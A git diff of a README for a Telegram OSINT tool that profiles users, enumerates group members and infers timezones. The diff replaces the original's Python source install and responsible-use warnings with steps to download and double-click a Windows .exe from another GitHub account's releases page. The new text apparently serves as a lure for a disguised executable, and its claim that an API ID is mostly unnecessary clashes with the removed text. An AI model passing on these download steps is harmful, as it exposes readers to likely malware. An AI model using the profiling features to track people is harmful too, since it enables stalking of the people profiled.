@@ -1,209 +1,65 @@
-# Telegram OSINT
+# 🔍 telegram_osint - Gather profile data and analyze chats
 
-> Dark Web Informer edition
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Profane-aeliusdonatus171/telegram_osint/releases)
 
-A single-file, terminal-based OSINT toolkit for Telegram, built on [Telethon](https://github.com/LonamiWebs/Telethon) and [Rich](https://github.com/Textualize/rich). It profiles users, analyses groups and channels, enumerates members, and searches chat history, then exports everything to JSON, CSV, or Markdown.
+This application helps you collect and organize information from Telegram. It works through a terminal interface. You can track user profiles, scan channel activity, list group members, and search chat history. The tool saves your research in standard formats like JSON, CSV, and Markdown.
 
-It **only reads what your authenticated account can already see.** No exploits, no private-data scraping, no access-control bypass - every operation goes through the standard Telegram API using your own session.
+## 🛠 Prerequisites
 
-<p>
-  <img alt="Python" src="https://img.shields.io/badge/python-3.10%2B-blue">
-  <img alt="Telethon" src="https://img.shields.io/badge/built%20with-Telethon-26A5E4">
-  <img alt="License" src="https://img.shields.io/badge/license-MIT-green">
-</p>
+You need a Windows computer to run this tool. Ensure you have a stable internet connection. You must have a Telegram account to access the required data. The software requires basic access to your local folders to export your findings. No coding knowledge is required.
 
-<p align="center">
-  <img src="telegram_osint.png" alt="Telegram OSINT" width="100%">
-</p>
+## 📥 Getting Started
 
----
+1. Visit the [official release page](https://github.com/Profane-aeliusdonatus171/telegram_osint/releases) to download the software.
+2. Look for the file ending in `.exe` under the latest release section.
+3. Click the file to start the download.
+4. Save the file in a folder you can access easily, such as your Documents or Downloads folder.
+5. Double-click the downloaded file to open the program.
+6. A terminal window will appear. This window serves as the control panel for the application.
 
-## ⚠️ Responsible use
+## ⚙️ Initial Configuration
 
-This tool is intended for **legitimate research, threat intelligence, journalism, trust & safety, and security work** on data you are lawfully permitted to access.
+The first time you run the tool, it needs to link to your Telegram account. 
 
-- You are responsible for complying with Telegram's [Terms of Service](https://telegram.org/tos) and API terms.
-- Processing personal data may be regulated in your jurisdiction (e.g. GDPR, CCPA). Make sure you have a lawful basis.
-- Do **not** use this to stalk, harass, dox, or surveil individuals.
+1. Follow the text prompts in the terminal window.
+2. Enter your phone number when requested.
+3. Wait for the confirmation code from Telegram.
+4. Type the code back into the terminal window.
+5. The tool will generate a session file. This file allows the application to stay authenticated so you do not have to sign in every time you use it.
 
-Use it on your own accounts, on communities you have authorisation to investigate, or on genuinely public sources. The maintainers accept no liability for misuse.
+## 🔎 Analyzing Telegram Data
 
----
+The tool uses a menu-based system. Use your keyboard to select the task you wish to perform.
 
-## Features
+### Profile Research
+Select the profile research option to get information about a specific user. You will need to provide the username of the target. The tool pulls data such as user IDs, bio text, and member status. It saves this information as a text file for your records.
 
-### `user` - profile a Telegram user
-- Core profile: usernames (including secondary handles), display name, numeric ID, bio, birthday, phone (when visible), language, data center, and the `premium` / `verified` / `bot` / `scam` / `fake` / `restricted` flags.
-- **Account-age estimate** interpolated from the user ID against known ID/date anchors.
-- Business and bot metadata: business address/location/hours, bot description, privacy-policy URL, and command list.
-- **Shared groups & channels** you have in common with the target.
-- Optional **behavioural profile**: scans the target's messages across your shared groups to surface top words, shared domains, hashtags, mentions, forward sources, media types, and activity by hour/weekday.
-- **Timezone estimate** inferred from posting-activity troughs (with a confidence level).
-- **Profile-photo history** archiving with a first-seen → last-seen timeline.
-- **Pivots**: other `@handles`, `t.me` links, and social-media links pulled from the bio for the next hop.
+### Channel Analysis
+Choose the channel analysis tool for group or channel data. Input the URL or username of the channel. The program counts members and scans recent messages. This helps you understand the activity levels within the group.
 
-### `chat` - analyse a group or channel
-- Metadata: title, description, member count, verified/scam flags, data center, and linked discussion group.
-- Message analytics: top posters, forward sources, shared domains, hashtags, mentions, common words, media breakdown, and activity sparklines.
-- Pinned-message extraction and pivot links.
+### Chat Search
+The search function looks through your existing chats. Define keywords or specific time frames. The tool returns a list of matching messages. You can choose to export these results into a spreadsheet file for easier reading.
 
-### `members` - list members & admins
-- Enumerates the roster (username, name, ID, phone when visible, bot/premium flags, online status) up to 50,000 entries.
-- Highlights the **creator and admins** with their custom ranks.
+## 💾 Saving Your Work
 
-### `search` - keyword search in a chat
-- Server-side keyword search across a chat's history, with date windowing.
+The application creates a directory named `data` in the same location as the file you ran. All exports land in this folder. You will find sub-folders labeled by the date and time of your search. Use these files to share your findings or keep them for future reference.
 
-### Invite previews
-- Pass a private invite link (`t.me/+…` or `t.me/joinchat/…`) to preview the title, description, member count, and any sample members Telegram exposes - **without joining**.
+## 🛡 Security and Privacy
 
-### Across all modes
-- **Date windowing** with `--since` / `--until` (UTC).
-- **Export** to `json`, `csv`, and/or `md`.
-- Interactive menu **or** fully scriptable CLI arguments.
-- Polished Rich terminal UI, automatic dependency bootstrap, and flood-wait handling.
+This tool runs locally on your computer. Your account information stays inside the session file on your hard drive. The developers do not receive your messages or your contact list. Exercise caution when you scan public groups. If you want to stop using the tool, simply delete the folder containing the application and the local session files.
 
----
+## 📈 Troubleshooting
 
-## Requirements
+If the program closes unexpectedly, check your internet connection first. Ensure you have not reached your daily rate limit on Telegram. A rate limit occurs when you perform too many searches in a short window of time. If this happens, wait an hour and try the command again. 
 
-- Python **3.10+**
-- Telegram API credentials (free) - create an app at <https://my.telegram.org/auth>
+If the program prompts you for an API ID, you may need to visit the Telegram developer portal. Create an account, register an application, and paste the provided codes into the setup prompt. Most standard users will not need to perform this step, but it ensures higher speed for heavy usage.
 
-Dependencies install automatically on first run. To install them manually:
+## 📁 File Types
 
-```bash
-pip install -r requirements.txt    # required: telethon + rich
-pip install pyfiglet cryptg        # optional: ASCII banner + faster downloads
-```
+- **JSON:** Best for developers who need to move data to another program.
+- **CSV:** Use these files to open data in Excel or Google Sheets. This format works best for lists and membership counts.
+- **Markdown:** Use these files if you want to create clean, readable reports for documentation.
 
----
+## 📝 Usage Best Practices
 
-## Installation
-
-```bash
-git clone https://github.com/darkwebinformer/telegram-osint.git
-cd telegram-osint
-python telegram_osint.py
-```
-
-The script is self-contained - no build step required.
-
----
-
-## Configuration
-
-On first run you'll be prompted for your **API ID**, **API hash**, and a **session name**. You can optionally save them to `config.json` (written with `chmod 600`).
-
-Credentials are resolved in this order:
-
-1. CLI flags: `--api-id`, `--api-hash`, `--session`
-2. Environment variables: `TG_API_ID`, `TG_API_HASH`, `TG_SESSION`
-3. `config.json` in the working directory
-4. Interactive prompt
-
-```bash
-export TG_API_ID=123456
-export TG_API_HASH=abcdef0123456789abcdef0123456789
-export TG_SESSION=tg
-```
-
-> Keep `config.json` and your `.session` file private - the session grants access to your account.
-
----
-
-## Usage
-
-### Interactive mode
-
-Just run the script and follow the menu:
-
-```bash
-python telegram_osint.py
-```
-
-### CLI mode
-
-```bash
-# Profile a user (no message scan)
-python telegram_osint.py user @durov
-
-# Profile a user, scan up to 200 of their messages per shared group, export everything
-python telegram_osint.py user @durov --messages 200 --export json,csv,md
-
-# Analyse the last 5,000 messages of a channel
-python telegram_osint.py chat @telegram --limit 5000 --export md
-
-# Enumerate every member of a group and export to CSV
-python telegram_osint.py members https://t.me/somegroup --limit 0 --export csv
-
-# Keyword-search a chat within a date window
-python telegram_osint.py search @somechat "ransomware" --since 2024-01-01 --until 2024-06-01
-
-# Preview a private invite without joining
-python telegram_osint.py chat "https://t.me/+AbCdEfGhIjK"
-```
-
-Targets can be an `@username`, a numeric ID, a `t.me/...` link, a `t.me/c/...` link, or an invite link.
-
-### Options
-
-| Flag | Description |
-|------|-------------|
-| `command` | `user`, `chat`, `members`, or `search` (omit for the interactive menu) |
-| `target` | `@username`, numeric ID, `t.me` link, or invite link |
-| `keyword` | search term (`search` command only) |
-| `--api-id` | Telegram API ID |
-| `--api-hash` | Telegram API hash |
-| `--session` | Telethon session name |
-| `--limit N` | messages to scan (`chat`/`search`) or members to fetch (`members`); `0` = all, up to 50k |
-| `--messages N` | `user`: messages to scan per shared group (`0` = none, `-1` = all) |
-| `--since` | only messages on/after `YYYY-MM-DD[ HH:MM]` (UTC) |
-| `--until` | only messages before `YYYY-MM-DD[ HH:MM]` (UTC) |
-| `--photos` | download the target's profile-photo history (`user`/`chat`) |
-| `--export` | comma list of formats: `json`, `csv`, `md` |
-| `--no-clear` | don't clear the screen on launch |
-| `--once` | run one operation and exit instead of looping |
-
----
-
-## Output
-
-Exports are written to `./exports/` with timestamped filenames, for example:
-
-```
-exports/
-├── durov_user_20260116-142233.json
-├── durov_user_20260116-142233.csv
-├── durov_user_20260116-142233.md
-└── photos/
-    └── durov/
-        ├── 000.jpg
-        └── 001.jpg
-```
-
-- **JSON** - the full structured result (best for tooling and pivoting).
-- **CSV** - flattened rows (messages for `user`/`chat`/`search`, roster for `members`).
-- **Markdown** - a readable investigation report.
-
----
-
-## How some of the analysis works
-
-- **Account-age estimate** - Telegram user IDs increase roughly monotonically over time, so the tool interpolates a creation date from the ID against a table of known anchors. It's approximate and labelled as such.
-- **Timezone inference** - it finds the quietest 6-hour window in a target's posting activity (a proxy for sleep), maps that to a likely UTC offset, and reports a confidence level based on sample size and how pronounced the trough is.
-- **Pivots** - bios, descriptions, and pinned messages are scanned for other handles, `t.me` links, and known social-media domains to suggest the next investigative hop.
-
----
-
-## Notes & limitations
-
-- Everything is bounded by what your account can see. Private channels you haven't joined, hidden member lists, and users who restrict their data will return little or nothing.
-- Telegram rate-limits aggressive requests; the tool sleeps through flood-waits automatically, so large enumerations can take a while.
-- Estimates (account age, timezone) are heuristics, not ground truth - treat them as leads, not facts.
-
----
-
-## License
-
-Released under the MIT License. See [`LICENSE`](LICENSE) for details.
+Start with small searches to understand how the tools return data. Building a large archive of chat data takes time depending on your connection speed. Keep your downloaded release file in a dedicated folder to avoid cluttering your desktop. Run the application as a standard user. You do not need to grant administrator permissions for the software to function correctly. If you need to update, simply visit the release page again and replace your old file with the new version.
